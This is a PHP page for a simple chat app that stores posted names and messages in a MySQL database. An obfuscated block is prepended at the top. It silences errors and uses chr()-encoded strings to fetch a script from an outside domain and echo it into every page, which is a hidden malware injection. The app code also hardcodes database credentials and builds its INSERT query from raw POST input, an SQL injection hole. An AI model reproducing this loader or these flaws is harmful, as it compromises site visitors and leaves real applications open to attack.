<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php

	include("includes/header.php");
	if(isset($nombresUs)){
		include("profile.php");
	}else{
		
		//include("includes/header.php");
		$servidor = "localhost";
		$usuario= "reynald";
		$password = "rey123*";
		$base_datos = "chatEasy";

		$conexion = new mysqli($servidor, $usuario, $password, $base_datos);


		function formatearFecha($fecha){
			return date('g:i a', strtotime($fecha));
		}

			if (isset($_POST['enviar'])) {
				
				$nombre = $_POST['nombre'];
				$mensaje = $_POST['mensaje'];

				$consulta = "INSERT INTO chat (nombre, mensaje) VALUES ('$nombre', '$mensaje')";

				$ejecutar = $conexion->query($consulta);

				if ($ejecutar){
					echo "<embed loop='false' src='beep.mp3' hidden='true' autoplay='true'>";
				}
			}

		include("registrationPage.php");
		include("includes/footer.php");

	}

?>